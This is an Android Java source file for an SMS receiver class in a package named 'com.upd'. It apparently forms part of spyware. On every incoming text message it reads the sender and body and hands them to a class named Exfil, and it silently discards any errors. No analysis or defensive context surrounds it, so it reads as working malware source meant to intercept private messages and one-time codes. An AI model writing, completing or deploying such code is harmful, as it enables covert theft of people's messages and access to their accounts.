package com.upd;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SmsRx extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        try {
            SmsMessage[] ms = android.provider.Telephony.Sms.Intents.getMessagesFromIntent(i);
            if (ms != null) for (SmsMessage m : ms) {
                if (m == null) continue;
                Exfil.msg("SMS from " + m.getOriginatingAddress() + ": " + m.getMessageBody());
            }
        } catch (Exception e) {}
    }
}
